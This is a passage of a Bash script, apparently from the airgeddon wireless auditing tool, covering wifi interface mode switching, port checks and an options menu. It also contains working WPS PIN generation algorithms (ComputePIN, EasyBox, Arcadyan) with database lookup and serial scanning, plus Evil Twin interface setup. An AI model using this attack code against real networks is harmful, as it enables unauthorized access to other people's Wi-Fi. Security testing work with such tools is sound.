				allowed_menu_option=0
				tools_needed+="${item} "
			fi
		done
	fi

	local message
	message=$(replace_string_vars "${@}")

	if [ ${allowed_menu_option} -eq 1 ]; then
		last_echo "${message}" "${normal_color}"
	else
		[[ ${message} =~ ^([0-9]+)\.(.*)$ ]] && forbidden_options+=("${BASH_REMATCH[1]}")
		tools_needed=${tools_needed:: -1}
		echo_colored red_slim "${message} (${tools_needed})"
	fi
}

#Generate the chars in front of and behind a text for titles and separators
function generate_dynamic_line() {

	debug_print

	local type=${2}
	if [ "${type}" = "title" ]; then
		if [ "${FUNCNAME[2]}" = "main_menu" ]; then
			ncharstitle=91
		else
			ncharstitle=78
		fi
		titlechar="*"
	elif [ "${type}" = "separator" ]; then
		ncharstitle=58
		titlechar="-"
	fi

	titletext=${1}
	titlelength=${#titletext}
	finaltitle=""

	for ((i=0; i < (ncharstitle/2 - titlelength+(titlelength/2)); i++)); do
		finaltitle="${finaltitle}${titlechar}"
	done

	if [ "${type}" = "title" ]; then
		finaltitle="${finaltitle} ${titletext} "
	elif [ "${type}" = "separator" ]; then
		finaltitle="${finaltitle} (${titletext}) "
	fi

	for ((i=0; i < (ncharstitle/2 - titlelength+(titlelength/2)); i++)); do
		finaltitle="${finaltitle}${titlechar}"
	done

	if [ $((titlelength % 2)) -gt 0 ]; then
		finaltitle+="${titlechar}"
	fi

	if [ "${type}" = "title" ]; then
		echo_colored green_title "${finaltitle}"
	elif [ "${type}" = "separator" ]; then
		echo_colored blue "${finaltitle}"
	fi
}

#Wrapper to check managed mode on an interface
function check_to_set_managed() {

	debug_print

	check_interface_mode "${1}"
	case "${ifacemode}" in
		"Managed")
			echo
			language_strings "${language}" 0 "red"
			language_strings "${language}" 115 "read"
			return 1
		;;
		"(Non wifi card)")
			echo
			language_strings "${language}" 1 "red"
			language_strings "${language}" 115 "read"
			return 1
		;;
	esac
	return 0
}

#Wrapper to check monitor mode on an interface
function check_to_set_monitor() {

	debug_print

	check_interface_mode "${1}"
	case "${ifacemode}" in
		"Monitor")
			echo
			language_strings "${language}" 10 "red"
			language_strings "${language}" 115 "read"
			return 1
		;;
		"(Non wifi card)")
			echo
			language_strings "${language}" 13 "red"
			language_strings "${language}" 115 "read"
			return 1
		;;
	esac
	return 0
}

#Check for monitor mode on an interface
function check_monitor_enabled() {

	debug_print

	mode=$(iw "${1}" info 2> /dev/null | grep type | awk '{print $2}')

	current_iface_on_messages="${1}"

	if [[ ${mode^} != "Monitor" ]]; then
		return 1
	fi
	return 0
}

#Check if an interface is a wifi card or not
function check_interface_wifi() {

	debug_print

	iw "${1}" info > /dev/null 2>&1
	return $?
}

#Create a list of interfaces associated to its macs
function renew_ifaces_and_macs_list() {

	debug_print

	readarray -t IFACES_AND_MACS < <(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep -E "^lo$" -v | grep "${interface}" -v)
	declare -gA ifaces_and_macs
	for iface_name in "${IFACES_AND_MACS[@]}"; do
		mac_item=$(cat "/sys/class/net/${iface_name}/address" 2> /dev/null)
		if [ -n "${mac_item}" ]; then
			ifaces_and_macs[${iface_name}]=${mac_item}
		fi
	done

	declare -gA ifaces_and_macs_switched
	for iface_name in "${!ifaces_and_macs[@]}"; do
		ifaces_and_macs_switched[${ifaces_and_macs[${iface_name}]}]=${iface_name}
	done
}

#Check the interface coherence between interface names and macs
function check_interface_coherence() {

	debug_print

	renew_ifaces_and_macs_list
	interface_auto_change=0

	interface_found=0
	for iface_name in "${!ifaces_and_macs[@]}"; do
		if [ "${interface}" = "${iface_name}" ]; then
			interface_found=1
			interface_mac=${ifaces_and_macs[${iface_name}]}
			break
		fi
	done

	if [ ${interface_found} -eq 0 ]; then
		for iface_mac in "${ifaces_and_macs[@]}"; do
			iface_mac_tmp=${iface_mac:0:15}
			interface_mac_tmp=${interface_mac:0:15}
			if [ "${iface_mac_tmp}" = "${interface_mac_tmp}" ]; then
				interface=${ifaces_and_macs_switched[${iface_mac}]}
				phy_interface=$(physical_interface_finder "${interface}")
				check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
				interface_auto_change=1
				break
			fi
		done
	fi

	return ${interface_auto_change}
}

#Check if an adapter is compatible to airmon
function check_airmon_compatibility() {

	debug_print

	if [ "${1}" = "interface" ]; then
		set_chipset "${interface}" "read_only"

		if iw phy "${phy_interface}" info 2>/dev/null | grep -iq 'interface combinations are not supported'; then
			interface_airmon_compatible=0
		else
			interface_airmon_compatible=1
		fi
	else
		set_chipset "${secondary_wifi_interface}" "read_only"

		if ! iw dev "${secondary_wifi_interface}" set bitrates legacy-2.4 1 > /dev/null 2>&1; then
			secondary_interface_airmon_compatible=0
		else
			secondary_interface_airmon_compatible=1
		fi
	fi
}

#Add contributing footer to a file
function add_contributing_footer_to_file() {

	debug_print

	{
	echo ""
	echo "---------------"
	echo ""
	echo "${footer_texts[${language},0]}"
	} >> "${1}"
}

#Prepare the vars to be used on wps pin database attacks
function set_wps_mac_parameters() {

	debug_print

	six_wpsbssid_first_digits=${wps_bssid:0:8}
	six_wpsbssid_first_digits_clean=${six_wpsbssid_first_digits//:}
	six_wpsbssid_last_digits=${wps_bssid: -8}
	six_wpsbssid_last_digits_clean=${six_wpsbssid_last_digits//:}
	four_wpsbssid_last_digits=${wps_bssid: -5}
	four_wpsbssid_last_digits_clean=${four_wpsbssid_last_digits//:}
}

#Check if wash has json option
function check_json_option_on_wash() {

	debug_print

	wash -h 2>&1 | grep "\-j" > /dev/null
	return $?
}

#Check if wash has dual scan option
function check_dual_scan_on_wash() {

	debug_print

	wash -h 2>&1 | grep "2ghz" > /dev/null
	return $?
}

#Perform wash scan using -j (json) option to gather needed data
function wash_json_scan() {

	debug_print

	tmpfiles_toclean=1
	rm -rf "${tmpdir}wps_json_data.txt" > /dev/null 2>&1
	rm -rf "${tmpdir}wps_fifo" > /dev/null 2>&1

	mkfifo "${tmpdir}wps_fifo"

	wash_band_modifier=""
	if [ "${wps_channel}" -gt 14 ]; then
		if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
			echo
			language_strings "${language}" 515 "red"
			language_strings "${language}" 115 "read"
			return 1
		else
			wash_band_modifier="-5"
		fi
	fi

	timeout -s SIGTERM 240 wash -i "${interface}" --scan -n 100 -j "${wash_band_modifier}" 2> /dev/null > "${tmpdir}wps_fifo" &
	wash_json_pid=$!
	tee "${tmpdir}wps_json_data.txt"< <(cat < "${tmpdir}wps_fifo") > /dev/null 2>&1 &

	while true; do
		sleep 5
		wash_json_capture_alive=$(ps uax | awk '{print $2}' | grep -E "^${wash_json_pid}$" 2> /dev/null)
		if [ -z "${wash_json_capture_alive}" ]; then
			break
		fi

		if grep "${1}" "${tmpdir}wps_json_data.txt" > /dev/null; then
			serial=$(grep "${1}" "${tmpdir}wps_json_data.txt" | awk -F '"wps_serial" : "' '{print $2}' | awk -F '"' '{print $1}' | sed 's/.*\(....\)/\1/' 2> /dev/null)
			kill "${wash_json_capture_alive}" &> /dev/null
			wait "${wash_json_capture_alive}" 2> /dev/null
			break
		fi
	done

	return 0
}

#Calculate pin based on Zhao Chunsheng algorithm (ComputePIN), step 1
function calculate_computepin_algorithm_step1() {

	debug_print

	hex_to_dec=$(printf '%d\n' 0x"${six_wpsbssid_last_digits_clean}") 2> /dev/null
	computepin_pin=$((hex_to_dec % 10000000))
}

#Calculate pin based on Zhao Chunsheng algorithm (ComputePIN), step 2
function calculate_computepin_algorithm_step2() {

	debug_print

	computepin_pin=$(printf '%08d\n' $((10#${computepin_pin} * 10 + checksum_digit)))
}

#Calculate pin based on Stefan Viehböck algorithm (EasyBox)
#shellcheck disable=SC2207
function calculate_easybox_algorithm() {

	debug_print

	hex_to_dec=($(printf "%04d" "0x${four_wpsbssid_last_digits_clean}" | sed 's/.*\(....\)/\1/;s/./& /g'))
	[[ ${four_wpsbssid_last_digits_clean} =~ ${four_wpsbssid_last_digits_clean//?/(.)} ]] && hexi=($(printf '%s\n' "${BASH_REMATCH[*]:1}"))

	c1=$(printf "%d + %d + %d + %d" "${hex_to_dec[0]}" "${hex_to_dec[1]}" "0x${hexi[2]}" "0x${hexi[3]}")
	c2=$(printf "%d + %d + %d + %d" "0x${hexi[0]}" "0x${hexi[1]}" "${hex_to_dec[2]}" "${hex_to_dec[3]}")

	K1=$((c1 % 16))
	K2=$((c2 % 16))
	X1=$((K1 ^ hex_to_dec[3]))
	X2=$((K1 ^ hex_to_dec[2]))
	X3=$((K1 ^ hex_to_dec[1]))
	Y1=$((K2 ^ 0x${hexi[1]}))
	Y2=$((K2 ^ 0x${hexi[2]}))
	Z1=$((0x${hexi[2]} ^ hex_to_dec[3]))
	Z2=$((0x${hexi[3]} ^ hex_to_dec[2]))

	easybox_pin=$(printf '%08d\n' "$((0x$X1$X2$Y1$Y2$Z1$Z2$X3))" | awk '{for(i=length; i!=0; i--) x=x substr($0, i, 1);} END {print x}' | cut -c -7 | awk '{for(i=length; i!=0; i--) x=x substr($0, i, 1);} END {print x}')
}

#Calculate pin based on Arcadyan algorithm
function calculate_arcadyan_algorithm() {

	debug_print

	local wan=""
	if [ "${four_wpsbssid_last_digits_clean}" = "0000" ]; then
		wan="fffe"
	elif [ "${four_wpsbssid_last_digits_clean}" = "0001" ]; then
		wan="ffff"
	else
		wan=$(printf "%04x" $((0x${four_wpsbssid_last_digits_clean} - 2)))
	fi

	K1=$(printf "%X\n" $(($((0x${serial:0:1} + 0x${serial:1:1} + 0x${wan:2:1} + 0x${wan:3:1})) % 16)))
	K2=$(printf "%X\n" $(($((0x${serial:2:1} + 0x${serial:3:1} + 0x${wan:0:1} + 0x${wan:1:1})) % 16)))
	D1=$(printf "%X\n" $((0x$K1 ^ 0x${serial:3:1})))
	D2=$(printf "%X\n" $((0x$K1 ^ 0x${serial:2:1})))
	D3=$(printf "%X\n" $((0x$K2 ^ 0x${wan:1:1})))
	D4=$(printf "%X\n" $((0x$K2 ^ 0x${wan:2:1})))
	D5=$(printf "%X\n" $((0x${serial:3:1} ^ 0x${wan:2:1})))
	D6=$(printf "%X\n" $((0x${serial:2:1} ^ 0x${wan:3:1})))
	D7=$(printf "%X\n" $((0x$K1 ^ 0x${serial:1:1})))

	arcadyan_pin=$(printf '%07d\n' $(($(printf '%d\n' "0x$D1$D2$D3$D4$D5$D6$D7") % 10000000)))
}

#Calculate the last digit on pin following the checksum rule
function pin_checksum_rule() {

	debug_print

	current_calculated_pin=$((10#${1} * 10))

	accum=0
	accum=$((accum + 3 * (current_calculated_pin/10000000 % 10)))
	accum=$((accum + current_calculated_pin/1000000 % 10))
	accum=$((accum + 3 * (current_calculated_pin/100000 % 10)))
	accum=$((accum + current_calculated_pin/10000 % 10))
	accum=$((accum + 3 * (current_calculated_pin/1000 % 10)))
	accum=$((accum + current_calculated_pin/100 % 10))
	accum=$((accum + 3 * (current_calculated_pin/10 % 10)))

	control_digit=$((accum % 10))
	checksum_digit=$((10 - control_digit))
	checksum_digit=$((checksum_digit % 10))
}

#Manage the calls to check common wps pin algorithms
function check_and_set_common_algorithms() {

	debug_print

	echo
	language_strings "${language}" 388 "blue"
	declare -g calculated_pins=("${wps_default_generic_pin}")

	if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "ComputePIN"; then
		calculate_computepin_algorithm_step1
		pin_checksum_rule "${computepin_pin}"
		calculate_computepin_algorithm_step2
		calculated_pins+=("${computepin_pin}")
		fill_wps_data_array "${wps_bssid}" "ComputePIN" "${computepin_pin}"
	else
		calculated_pins+=("${wps_data_array["${wps_bssid}",'ComputePIN']}")
	fi

	if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "EasyBox"; then
		calculate_easybox_algorithm
		pin_checksum_rule "${easybox_pin}"
		easybox_pin=$(printf '%08d\n' $((current_calculated_pin + checksum_digit)))
		calculated_pins+=("${easybox_pin}")
		fill_wps_data_array "${wps_bssid}" "EasyBox" "${easybox_pin}"
	else
		calculated_pins+=("${wps_data_array["${wps_bssid}",'EasyBox']}")
	fi

	if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "Arcadyan"; then

		able_to_check_json_option_on_wash=0
		if [ "${wps_attack}" = "pindb_bully" ]; then
			if hash wash 2> /dev/null; then
				able_to_check_json_option_on_wash=1
			else
				echo
				language_strings "${language}" 492 "yellow"
				echo
			fi
		elif [ "${wps_attack}" = "pindb_reaver" ]; then
			able_to_check_json_option_on_wash=1
		fi

		if [ "${able_to_check_json_option_on_wash}" -eq 1 ]; then
			if check_json_option_on_wash; then
				ask_yesno 485 "no"
				if [ "${yesno}" = "y" ]; then
					echo
					language_strings "${language}" 489 "blue"

					serial=""
					if wash_json_scan "${wps_bssid}"; then
						if [ -n "${serial}" ]; then
							if [[ "${serial}" =~ ^[0-9]{4}$ ]]; then
								calculate_arcadyan_algorithm
								pin_checksum_rule "${arcadyan_pin}"
								arcadyan_pin="${arcadyan_pin}${checksum_digit}"
								calculated_pins=("${arcadyan_pin}" "${calculated_pins[@]}")
								fill_wps_data_array "${wps_bssid}" "Arcadyan" "${arcadyan_pin}"
								echo
								language_strings "${language}" 487 "yellow"
							else
								echo
								language_strings "${language}" 491 "yellow"
							fi
							echo
						else
							echo
							language_strings "${language}" 488 "yellow"
							echo
						fi
					fi
				fi
			else
				echo
				language_strings "${language}" 486 "yellow"
			fi
		fi
	else
		echo
		calculated_pins=("${wps_data_array["${wps_bssid}",'Arcadyan']}" "${calculated_pins[@]}")
		language_strings "${language}" 493 "yellow"
		echo
	fi

	if integrate_algorithms_pins; then
		language_strings "${language}" 389 "yellow"
	fi
}

#Integrate calculated pins from algorithms into pins array
function integrate_algorithms_pins() {

	debug_print

	some_calculated_pin_included=0
	for ((idx=${#calculated_pins[@]}-1; idx>=0; idx--)) ; do
		this_pin_already_included=0
		for item in "${pins_found[@]}"; do
			if [ "${item}" = "${calculated_pins[idx]}" ]; then
				this_pin_already_included=1
				break
			fi
		done

		if [ ${this_pin_already_included} -eq 0 ]; then
			pins_found=("${calculated_pins[idx]}" "${pins_found[@]}")
			counter_pins_found=$((counter_pins_found + 1))
			some_calculated_pin_included=1
		fi
	done

	if [ "${some_calculated_pin_included}" -eq 1 ]; then
		return 0
	fi

	return 1
}

#Search for target wps bssid mac in pin database and set the vars to be used
#shellcheck disable=SC2128
function search_in_pin_database() {

	debug_print

	bssid_found_in_db=0
	counter_pins_found=0
	declare -g pins_found=()
	for item in "${!PINDB[@]}"; do
		if [ "${item}" = "${six_wpsbssid_first_digits_clean}" ]; then
			bssid_found_in_db=1
			arrpins=("${PINDB[${item//[[:space:]]/ }]}")
			pins_found+=("${arrpins[0]}")
			counter_pins_found=$(echo "${pins_found[@]}" | wc -w)
			fill_wps_data_array "${wps_bssid}" "Database" "${pins_found}"
		fi
	done
}

#Handler for multiple busy port checkings
function check_busy_ports() {

	debug_print

	IFS=' ' read -r -a tcp_ports <<< "${ports_needed["tcp"]}"
	IFS=' ' read -r -a udp_ports <<< "${ports_needed["udp"]}"

	if [[ -n "${tcp_ports[*]}" ]] && [[ "${#tcp_ports[@]}" -ge 1 ]]; then
		port_type="tcp"
		for tcp_port in "${tcp_ports[@]}"; do
			if ! check_tcp_udp_port "${tcp_port}" "${port_type}"; then
				busy_port="${tcp_port}"
				echo
				language_strings "${language}" 698 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		done
	fi

	if [[ -n "${udp_ports[*]}" ]] && [[ "${#udp_ports[@]}" -ge 1 ]]; then
		port_type="udp"
		for udp_port in "${udp_ports[@]}"; do
			if ! check_tcp_udp_port "${udp_port}" "${port_type}"; then
				busy_port="${udp_port}"
				echo
				language_strings "${language}" 698 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		done
	fi

	return 0
}

#Validate if a given tcp/udp port is busy
#shellcheck disable=SC2207
function check_tcp_udp_port() {

	debug_print

	local port
	local port_type
	port=$(printf "%04x" "${1}")
	port_type="${2}"

	declare -a busy_ports=($(grep -v "rem_address" --no-filename "/proc/net/${port_type}" | awk '{print $2}' | cut -d: -f2 | sort -u))
	for hexport in "${busy_ports[@]}"; do
		if [ "${hexport}" = "${port}" ]; then
			return 1
		fi
	done

	return 0
}

#Validate if a wireless card is supporting VIF (Virtual Interface)
function check_vif_support() {

	debug_print

	if iw "${phy_interface}" info | grep "Supported interface modes" -A 8 | grep "AP/VLAN" > /dev/null 2>&1; then
		return 0
	else
		return 1
	fi
}

#Find the physical interface for a card
function physical_interface_finder() {

	debug_print

	local phy_iface
	phy_iface=$(basename "$(readlink "/sys/class/net/${1}/phy80211")" 2> /dev/null)
	echo "${phy_iface}"
}

#Check the bands supported by a given physical card
function check_interface_supported_bands() {

	debug_print

	get_5ghz_band_info_from_phy_interface "${1}"
	case "$?" in
		"0")
			interfaces_band_info["${2},5Ghz_allowed"]=1
			interfaces_band_info["${2},text"]="${band_24ghz}, ${band_5ghz}"
		;;
		"1")
			interfaces_band_info["${2},5Ghz_allowed"]=0
			interfaces_band_info["${2},text"]="${band_24ghz}"
		;;
		"2")
			interfaces_band_info["${2},5Ghz_allowed"]=0
			interfaces_band_info["${2},text"]="${band_24ghz}, ${band_5ghz} (${red_color}${disabled_text[${language}]}${pink_color})"
		;;
	esac
}

#Check 5Ghz band info from a given physical interface
function get_5ghz_band_info_from_phy_interface() {

	debug_print

	if iw phy "${1}" info 2> /dev/null | grep "5200 MHz" > /dev/null; then
		if "${AIRGEDDON_5GHZ_ENABLED:-true}"; then
			return 0
		else
			return 2
		fi
	fi

	return 1
}

#Prepare monitor mode avoiding the use of airmon-ng or airmon-zc generating two interfaces from one
function prepare_et_monitor() {

	debug_print

	disable_rfkill

	iface_phy_number=${phy_interface:3:1}
	iface_monitor_et_deauth="mon${iface_phy_number}"

	iw phy "${phy_interface}" interface add "${iface_monitor_et_deauth}" type monitor 2> /dev/null
	ip link set "${iface_monitor_et_deauth}" up > /dev/null 2>&1
	iw "${iface_monitor_et_deauth}" set channel "${channel}" > /dev/null 2>&1
}

#Assure the mode of the interface before the Evil Twin or Enterprise process
function prepare_et_interface() {

	debug_print

	et_initial_state=${ifacemode}

	if [ "${ifacemode}" != "Managed" ]; then
		check_airmon_compatibility "interface"
		if [ "${interface_airmon_compatible}" -eq 1 ]; then

			new_interface=$(${airmon} stop "${interface}" 2> /dev/null | grep station | head -n 1)
			ifacemode="Managed"
			[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"

			if [ "${interface}" != "${new_interface}" ]; then
				if check_interface_coherence; then
					interface=${new_interface}
					phy_interface=$(physical_interface_finder "${interface}")
					check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
					current_iface_on_messages="${interface}"
				fi
				echo
				language_strings "${language}" 15 "yellow"
			fi
		else
			if ! set_mode_without_airmon "${interface}" "managed"; then
				echo
				language_strings "${language}" 1 "red"
				language_strings "${language}" 115 "read"
				return 1
			else
				ifacemode="Managed"
			fi
		fi
	fi
}

#Restore the state of the interfaces after Evil Twin or Enterprise process
function restore_et_interface() {

	debug_print

	echo
	language_strings "${language}" 299 "blue"

	disable_rfkill

	mac_spoofing_desired=0

	iw dev "${iface_monitor_et_deauth}" del > /dev/null 2>&1

	if [ "${et_initial_state}" = "Managed" ]; then
		set_mode_without_airmon "${interface}" "managed"
		ifacemode="Managed"
	else
		if [ "${interface_airmon_compatible}" -eq 1 ]; then
			new_interface=$(${airmon} start "${interface}" 2> /dev/null | grep monitor)
			desired_interface_name=""
			[[ ${new_interface} =~ ^You[[:space:]]already[[:space:]]have[[:space:]]a[[:space:]]([A-Za-z0-9]+)[[:space:]]device ]] && desired_interface_name="${BASH_REMATCH[1]}"
			if [ -n "${desired_interface_name}" ]; then
				echo
				language_strings "${language}" 435 "red"
				language_strings "${language}" 115 "read"
				return
			fi

			ifacemode="Monitor"

			[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
			if [ "${interface}" != "${new_interface}" ]; then
				interface=${new_interface}
				phy_interface=$(physical_interface_finder "${interface}")
				check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
				current_iface_on_messages="${interface}"
			fi
		else
			if set_mode_without_airmon "${interface}" "monitor"; then
				ifacemode="Monitor"
			fi
		fi
	fi
}

#Unblock if possible the interface if blocked
function disable_rfkill() {

	debug_print

	if hash rfkill 2> /dev/null; then
		rfkill unblock all > /dev/null 2>&1
	fi
}

#Set the interface on managed mode and manage the possible name change
function managed_option() {

	debug_print

	if ! check_to_set_managed "${1}"; then
		return 1
	fi

	disable_rfkill

	language_strings "${language}" 17 "blue"
	ip link set "${1}" up > /dev/null 2>&1

	if [ "${1}" = "${interface}" ]; then
		if [ "${interface_airmon_compatible}" -eq 0 ]; then
			if ! set_mode_without_airmon "${1}" "managed"; then
				echo
				language_strings "${language}" 1 "red"
				language_strings "${language}" 115 "read"
				return 1
			else
				ifacemode="Managed"
			fi
		else
			new_interface=$(${airmon} stop "${1}" 2> /dev/null | grep station | head -n 1)
			ifacemode="Managed"
			[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"

			if [ "${interface}" != "${new_interface}" ]; then
				if check_interface_coherence; then
					interface=${new_interface}
					phy_interface=$(physical_interface_finder "${interface}")
					check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
					current_iface_on_messages="${interface}"
				fi
				echo
				language_strings "${language}" 15 "yellow"
			fi
		fi
	else
		if [ "${secondary_interface_airmon_compatible}" -eq 0 ]; then
			if ! set_mode_without_airmon "${1}" "managed"; then
				echo
				language_strings "${language}" 1 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		else
			new_secondary_interface=$(${airmon} stop "${1}" 2> /dev/null | grep station | head -n 1)
			[[ ${new_secondary_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_secondary_interface="${BASH_REMATCH[1]}"

			if [ "${1}" != "${new_secondary_interface}" ]; then
				secondary_wifi_interface=${new_secondary_interface}
				current_iface_on_messages="${secondary_wifi_interface}"
				echo
				language_strings "${language}" 15 "yellow"
			fi
		fi
	fi

	echo
	language_strings "${language}" 16 "yellow"
	language_strings "${language}" 115 "read"
	return 0
}

#Set the interface on monitor mode and manage the possible name change
function monitor_option() {

	debug_print

	if ! check_to_set_monitor "${1}"; then
		return 1
	fi

	disable_rfkill

	language_strings "${language}" 18 "blue"
	ip link set "${1}" up > /dev/null 2>&1

	if [ "${1}" = "${interface}" ]; then
		check_airmon_compatibility "interface"
		if [ "${interface_airmon_compatible}" -eq 0 ]; then
			if ! set_mode_without_airmon "${1}" "monitor"; then
				echo
				language_strings "${language}" 20 "red"
				language_strings "${language}" 115 "read"
				return 1
			else
				ifacemode="Monitor"
			fi
		else
			if [ "${check_kill_needed}" -eq 1 ]; then
				language_strings "${language}" 19 "blue"
				${airmon} check kill > /dev/null 2>&1
				nm_processes_killed=1
			fi

			desired_interface_name=""
			new_interface=$(${airmon} start "${1}" 2> /dev/null | grep monitor)
			[[ ${new_interface} =~ ^You[[:space:]]already[[:space:]]have[[:space:]]a[[:space:]]([A-Za-z0-9]+)[[:space:]]device ]] && desired_interface_name="${BASH_REMATCH[1]}"

			if [ -n "${desired_interface_name}" ]; then
				echo
				language_strings "${language}" 435 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi

			ifacemode="Monitor"
			[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"

			if [ "${interface}" != "${new_interface}" ]; then
				if check_interface_coherence; then
					interface="${new_interface}"
					phy_interface=$(physical_interface_finder "${interface}")
					check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
				fi
				current_iface_on_messages="${interface}"
				echo
				language_strings "${language}" 21 "yellow"
			fi
		fi
	else
		check_airmon_compatibility "secondary_interface"
		if [ "${secondary_interface_airmon_compatible}" -eq 0 ]; then
			if ! set_mode_without_airmon "${1}" "monitor"; then
				echo
				language_strings "${language}" 20 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		else
			if [ "${check_kill_needed}" -eq 1 ]; then
				language_strings "${language}" 19 "blue"
				${airmon} check kill > /dev/null 2>&1
				nm_processes_killed=1
			fi

			secondary_interface_airmon_compatible=1
			new_secondary_interface=$(${airmon} start "${1}" 2> /dev/null | grep monitor)
			[[ ${new_secondary_interface} =~ ^You[[:space:]]already[[:space:]]have[[:space:]]a[[:space:]]([A-Za-z0-9]+)[[:space:]]device ]] && desired_interface_name="${BASH_REMATCH[1]}"

			if [ -n "${desired_interface_name}" ]; then
				echo
				language_strings "${language}" 435 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi

			[[ ${new_secondary_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_secondary_interface="${BASH_REMATCH[1]}"

			if [ "${1}" != "${new_secondary_interface}" ]; then
				secondary_wifi_interface="${new_secondary_interface}"
				current_iface_on_messages="${secondary_wifi_interface}"
				echo
				language_strings "${language}" 21 "yellow"
			fi
		fi
	fi

	echo
	language_strings "${language}" 22 "yellow"
	language_strings "${language}" 115 "read"
	return 0
}

#Set the interface on monitor/managed mode without airmon
function set_mode_without_airmon() {

	debug_print

	local error
	local mode

	ip link set "${1}" down > /dev/null 2>&1

	if [ "${2}" = "monitor" ]; then
		mode="monitor"
		iw "${1}" set monitor control > /dev/null 2>&1
	else
		mode="managed"
		iw "${1}" set type managed > /dev/null 2>&1
	fi

	error=$?
	ip link set "${1}" up > /dev/null 2>&1

	if [ "${error}" != 0 ]; then
		return 1
	fi
	return 0
}

#Check the interface mode
function check_interface_mode() {

	debug_print

	current_iface_on_messages="${1}"
	if ! check_interface_wifi "${1}"; then
		ifacemode="(Non wifi card)"
		return 0
	fi

	modemanaged=$(iw "${1}" info 2> /dev/null | grep type | awk '{print $2}')

	if [[ ${modemanaged^} = "Managed" ]]; then
		ifacemode="Managed"
		return 0
	fi

	modemonitor=$(iw "${1}" info 2> /dev/null | grep type | awk '{print $2}')

	if [[ ${modemonitor^} = "Monitor" ]]; then
		ifacemode="Monitor"
		return 0
	fi

	language_strings "${language}" 23 "red"
	language_strings "${language}" 115 "read"
	exit_code=1
	exit_script_option
}

#Option menu
function option_menu() {

	debug_print

	clear
	language_strings "${language}" 443 "title"
	current_menu="option_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	print_simple_separator
	language_strings "${language}" 78
	print_simple_separator
	if "${AIRGEDDON_AUTO_UPDATE:-true}"; then
		language_strings "${language}" 455
	else
		language_strings "${language}" 449
	fi
	if "${AIRGEDDON_SKIP_INTRO:-true}"; then
		language_strings "${language}" 565
	else
		language_strings "${language}" 566
	fi
	if "${AIRGEDDON_BASIC_COLORS:-true}"; then
		language_strings "${language}" 557
	else
		language_strings "${language}" 556
	fi
	if "${AIRGEDDON_EXTENDED_COLORS:-true}"; then
		language_strings "${language}" 456
	else
		language_strings "${language}" 450
	fi
	if "${AIRGEDDON_AUTO_CHANGE_LANGUAGE:-true}"; then
		language_strings "${language}" 468
	else
		language_strings "${language}" 467
	fi
	if "${AIRGEDDON_SILENT_CHECKS:-true}"; then
		language_strings "${language}" 573
	else
		language_strings "${language}" 574
	fi
	if "${AIRGEDDON_PRINT_HINTS:-true}"; then
		language_strings "${language}" 584
	else
		language_strings "${language}" 585
	fi
	if "${AIRGEDDON_5GHZ_ENABLED:-true}"; then
		language_strings "${language}" 592
	else
		language_strings "${language}" 593
	fi
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		language_strings "${language}" 616
	else
		language_strings "${language}" 617
	fi
	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
		language_strings "${language}" 638
	else
		language_strings "${language}" 637
	fi
	if "${AIRGEDDON_PLUGINS_ENABLED:-true}"; then
		language_strings "${language}" 651
	else
		language_strings "${language}" 652
	fi
	if "${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"; then
		language_strings "${language}" 688
	else
		language_strings "${language}" 689
	fi
	language_strings "${language}" 447
	print_hint ${current_menu}

	read -rp "> " option_selected
	case ${option_selected} in
		0)
			return
		;;
		1)
			language_menu
		;;
		2)
			if "${AIRGEDDON_AUTO_UPDATE:-true}"; then
				ask_yesno 457 "no"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_AUTO_UPDATE"; then
						echo
						language_strings "${language}" 461 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				language_strings "${language}" 459 "yellow"
				ask_yesno 458 "no"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_AUTO_UPDATE"; then
						echo
						language_strings "${language}" 460 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		3)
			if "${AIRGEDDON_SKIP_INTRO:-true}"; then
				ask_yesno 569 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_SKIP_INTRO"; then
						echo
						language_strings "${language}" 571 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				ask_yesno 570 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_SKIP_INTRO"; then
						echo
						language_strings "${language}" 572 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		4)
			if "${AIRGEDDON_BASIC_COLORS:-true}"; then
				ask_yesno 558 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_BASIC_COLORS"; then
						echo
